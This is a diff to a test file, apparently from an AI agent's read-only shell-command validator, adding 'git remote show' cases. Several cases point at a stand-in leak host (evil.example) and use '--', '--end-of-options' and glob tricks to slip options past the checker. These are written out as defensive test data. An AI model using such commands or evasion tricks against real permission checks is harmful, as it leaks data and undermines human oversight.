@@ -228,6 +228,29 @@ describe('evaluateShellCommandReadOnly', () => {
       'git remote unknown-action',
       'git remote show remove',
       'git remote get-url prune',
+      'git remote show origin',
+      'git remote show',
+      'git remote show https://evil.example/leak',
+      'git remote show git@evil.example:owner/repo',
+      // `-n` after `--` is a positional remote name, so the remote is still
+      // queried; the `-n` scan must stay on the pre-terminator slice (#14359).
+      'git remote show origin -- -n',
+      'git remote show -- -n https://evil.example/leak',
+      // git honours `--end-of-options` exactly like `--` (bot round 6 R6-1).
+      'git remote show https://evil.example/leak --end-of-options -n',
+      'git remote show --end-of-options https://evil.example/leak -n',
+      // A bracket glob expands to a real `--` when the cwd holds a file named
+      // `--`, but shell-quote leaves it as plain text (#14359).
+      'git remote show origin [--][--] -n',
+      'git remote show https://evil.example/leak [-]- -n',
+      // Bracket expressions such as `[]-]` and `[[:punct:]]` match `-` too.
+      'git remote show origin []-]- -n',
+      'git remote show https://evil.example/leak [[:punct:]]- -n',
+      // `*`, `?` and brace globs reach the same `--`; the argument guard in
+      // isShellCommandReadOnly refuses them before the remote check runs.
+      'git remote show origin * -n',
+      'git remote show origin ?? -n',
+      'git remote show origin {--,x} -n',
       'git diff --output=patch',
       'git log --output=log.out',
       'git show --output=show.out HEAD',
@@ -365,6 +388,15 @@ describe('evaluateShellCommandReadOnly', () => {
 
     it.each([
       'git remote get-url origin',
+      'git remote show -n origin',
+      'git remote show -n https://evil.example/leak',
+      // `-n` is honoured at any position before `--`, so a trailing `-n`
+      // suppresses the query too; pin it against a leading-options-only
+      // narrowing (#14359).
+      'git remote show origin -n',
+      'git remote show https://evil.example/leak -n',
+      // A `-n` before `--end-of-options` is still an option.
+      'git remote show -n --end-of-options origin',
       'git diff -- file',
       'git diff -Oorderfile',
       'git log -p',
